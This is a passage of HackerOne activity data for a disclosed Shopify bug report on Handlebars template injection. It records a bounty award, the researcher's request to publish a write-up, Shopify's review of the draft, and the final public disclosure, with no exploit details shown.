soon!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T21:54:34.042Z","updated_at":"2018-12-18T21:54:34.042Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"10000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"zombiehelp54","url":"/zombiehelp54"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3863995,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"Hey @zombiehelp54,\n\nIn addition to the bounty we would like to award you with some special Shopify security swag! We'll send it to the address listed in your HackerOne profile for swag (you might need to add one if you haven't already). ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIn addition to the bounty we would like to award you with some special Shopify security swag! We\u0026#39;ll send it to the address listed in your HackerOne profile for swag (you might need to add one if you haven\u0026#39;t already). \u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-18T21:58:28.329Z","updated_at":"2018-12-18T21:58:28.329Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"reporter":{"username":"zombiehelp54","url":"/zombiehelp54"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4212109,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, \nI would like to do a writeup about the handlebars bug, is it ok to mention this bug report within it? \n\nThanks!","markdown_message":"\u003cp\u003eHi, \u003cbr\u003e\nI would like to do a writeup about the handlebars bug, is it ok to mention this bug report within it? \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-26T00:28:26.373Z","updated_at":"2019-02-26T00:28:26.373Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4256918,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, any updates on the disclosure request? \n\nThanks!","markdown_message":"\u003cp\u003eHi, any updates on the disclosure request? \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-05T01:28:54.842Z","updated_at":"2019-03-05T01:28:54.842Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4261728,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zombiehelp54,\n\nSorry for the delay. Our team is comfortable with you blogging about this issue. Would it be possible for us to view a draft before the post goes up?\n\n- Jack","markdown_message":"\u003cp\u003eHi \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry for the delay. Our team is comfortable with you blogging about this issue. Would it be possible for us to view a draft before the post goes up?\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eJack\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2019-03-05T16:20:54.277Z","updated_at":"2019-03-05T16:20:54.277Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4436712,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jack_mccracken,\nFinally my blog post is ready. Here is a preview link: `https://mahmoudsec.blogspot.com/b/post-preview?token=APq4FmAEkJg36h6SCoJlAV-9mwNiHloHsABeKopdA1sR21k2M1H266kJvjxoaXvxsFpmHrZ5vvKn8E8uKtWZQ_gIXSfIWIYHJ_EQFwlkQQxQM64lc9yVIOZFqR786n2JXfDrtxXcS6Ap\u0026postId=1508108208797849527\u0026type=POST` \n\nPlease confirm if it's ok to publish it as it is now when possible.\n\nThanks,\nMahmoud","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e,\u003cbr\u003e\nFinally my blog post is ready. Here is a preview link: \u003ccode\u003ehttps://mahmoudsec.blogspot.com/b/post-preview?token=APq4FmAEkJg36h6SCoJlAV-9mwNiHloHsABeKopdA1sR21k2M1H266kJvjxoaXvxsFpmHrZ5vvKn8E8uKtWZQ_gIXSfIWIYHJ_EQFwlkQQxQM64lc9yVIOZFqR786n2JXfDrtxXcS6Ap\u0026amp;postId=1508108208797849527\u0026amp;type=POST\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003ePlease confirm if it\u0026#39;s ok to publish it as it is now when possible.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nMahmoud\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-01T22:01:14.009Z","updated_at":"2019-04-01T22:01:14.009Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4436842,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @zombiehelp54,\n\nThanks for the link. I've sent this off to the relevant teams at Shopify and will try and get back to you ASAP. We have our company-wide hackathon this Wed-Fri so it may take until next week.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the link. I\u0026#39;ve sent this off to the relevant teams at Shopify and will try and get back to you ASAP. We have our company-wide hackathon this Wed-Fri so it may take until next week.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-01T22:31:09.204Z","updated_at":"2019-04-01T22:31:09.204Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4443869,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zombiehelp54,\nit appears the token in the URL is time limited. Is it possible to provide one with a longer expiry time since we'll need a few days to review?\n\nThanks!\nPete","markdown_message":"\u003cp\u003eHi \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003cbr\u003e\nit appears the token in the URL is time limited. Is it possible to provide one with a longer expiry time since we\u0026#39;ll need a few days to review?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\nPete\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-02T13:00:06.019Z","updated_at":"2019-04-02T13:00:06.019Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4443936,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Peter,\nJust realized these preview links expire. I am outside right now, but if you want to access the blog post now please use this link it should work  for the next few hour:\n```\nhttps://mahmoudsec.blogspot.com/b/post-preview?token=APq4FmDywHHBe0VK_Nbuh_V_uT33oYHvow2D_V9fre45xJtyqLhtc1CNSomzZB5D-L6EVsLtj3z1QNAtyLR7Fhsu7XQs6VdodtL4lXsL1fy5yQHmhQdqgqK0VWM1L9-XQ-wORGn9DowJ\u0026postId=1508108208797849527\u0026type=POST\u0026m=1\n```\n\nI will send you a permanent link once I get back home.","markdown_message":"\u003cp\u003eHi Peter,\u003cbr\u003e\nJust realized these preview links expire. I am outside right now, but if you want to access the blog post now please use this link it should work  for the next few hour:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://mahmoudsec.blogspot.com/b/post-preview?token=APq4FmDywHHBe0VK_Nbuh_V_uT33oYHvow2D_V9fre45xJtyqLhtc1CNSomzZB5D-L6EVsLtj3z1QNAtyLR7Fhsu7XQs6VdodtL4lXsL1fy5yQHmhQdqgqK0VWM1L9-XQ-wORGn9DowJ\u0026amp;postId=1508108208797849527\u0026amp;type=POST\u0026amp;m=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI will send you a permanent link once I get back home.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-02T13:18:36.097Z","updated_at":"2019-04-02T13:18:36.097Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4444407,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks - I think we're good. I copied the text to a google doc.","markdown_message":"\u003cp\u003eThanks - I think we\u0026#39;re good. I copied the text to a google doc.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-02T14:52:44.942Z","updated_at":"2019-04-02T14:52:44.942Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4477966,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @zombiehelp54,\n\nHere's the Google Doc we copied the post to. We've added some comments/suggestions/corrections to the doc. If you agree with them, we are good with the post being published: https://docs.google.com/document/d/█████. We're also going to request that we fully disclose this report, and if you agree, you're welcome to include that link in the post.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s the Google Doc we copied the post to. We\u0026#39;ve added some comments/suggestions/corrections to the doc. If you agree with them, we are good with the post being published: \u003ca title=\"https://docs.google.com/document/d/%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88\" href=\"/redirect?url=https%3A%2F%2Fdocs.google.com%2Fdocument%2Fd%2F%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.google.com/document/d/%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. We\u0026#39;re also going to request that we fully disclose this report, and if you agree, you\u0026#39;re welcome to include that link in the post.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T15:33:28.226Z","updated_at":"2019-04-04T18:04:33.379Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4477967,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Requesting disclosure as mentioned above.","markdown_message":"\u003cp\u003eRequesting disclosure as mentioned above.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T15:33:49.684Z","updated_at":"2019-04-04T15:33:49.684Z","first_to_agree":true,"actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4478931,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jack_mccracken, \ncould you please tell me which parts have the comments/suggestions, I can't find them.\n\nThanks!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e, \u003cbr\u003e\ncould you please tell me which parts have the comments/suggestions, I can\u0026#39;t find them.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T16:50:41.849Z","updated_at":"2019-04-04T16:50:41.849Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4478991,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zombiehelp54, I just made the document editable for you so you should see the comments now -pete","markdown_message":"\u003cp\u003eHi \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e, I just made the document editable for you so you should see the comments now -pete\u003c/p\u003e\n","automated_response":true,"created_at":"2019-04-04T16:59:49.167Z","updated_at":"2019-04-04T16:59:49.167Z","actor":{"username":"shopify-bot","cleared":false,"url":"/shopify-bot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4478998,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Pete,\nCould you please tell me for which email you made it accessible? \n\nThanks!","markdown_message":"\u003cp\u003eHi Pete,\u003cbr\u003e\nCould you please tell me for which email you made it accessible? \u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T17:01:24.570Z","updated_at":"2019-04-04T17:01:24.570Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4479004,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Anyone with the link can edit it -pete","markdown_message":"\u003cp\u003eAnyone with the link can edit it -pete\u003c/p\u003e\n","automated_response":true,"created_at":"2019-04-04T17:02:05.495Z","updated_at":"2019-04-04T17:02:05.495Z","actor":{"username":"shopify-bot","cleared":false,"url":"/shopify-bot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4479159,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I have made the corrections to the blog post. Thanks @jack_mccracken and @shopify-peteryaworski for your help. \n\nThe blog post is now public at: https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html","markdown_message":"\u003cp\u003eI have made the corrections to the blog post. Thanks \u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e and \u003ca href=\"/shopify-peteryaworski\"\u003e@shopify-peteryaworski\u003c/a\u003e for your help. \u003c/p\u003e\n\n\u003cp\u003eThe blog post is now public at: \u003ca title=\"https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html\" href=\"/redirect?url=https%3A%2F%2Fmahmoudsec.blogspot.com%2F2019%2F04%2Fhandlebars-template-injection-and-rce.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-04T17:35:23.571Z","updated_at":"2019-04-04T17:35:23.571Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4479160,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-04T17:35:23.659Z","updated_at":"2019-04-04T17:35:23.659Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7146681,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-25T14:31:27.120Z","updated_at":"2020-02-25T14:31:27.120Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"Shopify Developed Apps","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":14989,"category":"researcher","content":"Full story with explanation of how this was exploited can be found here: https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eFull story with explanation of how this was exploited can be found here: \u003ca title=\"https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html\" href=\"/redirect?url=https%3A%2F%2Fmahmoudsec.blogspot.com%2F2019%2F04%2Fhandlebars-template-injection-and-rce.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n"}]}